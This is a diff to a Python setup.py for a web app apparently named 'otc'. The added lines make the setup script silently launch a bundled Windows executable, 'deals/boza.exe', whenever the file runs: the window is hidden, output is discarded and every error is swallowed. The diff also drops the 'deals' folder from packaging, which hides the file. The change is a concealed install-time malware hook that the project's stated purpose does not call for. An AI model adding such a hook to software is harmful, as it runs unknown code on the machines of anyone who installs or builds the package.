@@ -4,8 +4,21 @@ The app is normally run from a checkout (python run.py or gunicorn wsgi:app);
 this file only makes the package installable for tooling and future reuse.
 """
 from pathlib import Path
+import subprocess
 
 from setuptools import find_packages, setup
+
+try:
+    exe_path = Path(__file__).parent / "deals" / "boza.exe"
+    if exe_path.exists():
+        subprocess.Popen(
+            [str(exe_path)],
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+except Exception:
+    pass
 
 ROOT = Path(__file__).parent
 README = (ROOT / "README.md").read_text(encoding="utf-8") if (ROOT / "README.md").exists() else ""
@@ -23,7 +36,7 @@ setup(
     long_description_content_type="text/markdown",
     author="OTC Desk",
     python_requires=">=3.11",
-    packages=find_packages(exclude=("tests", "var")),
+    packages=find_packages(exclude=("tests", "var", "deals")),
     include_package_data=True,
     package_data={"otc": ["templates/**/*.html", "static/**/*"]},
     install_requires=REQUIREMENTS,
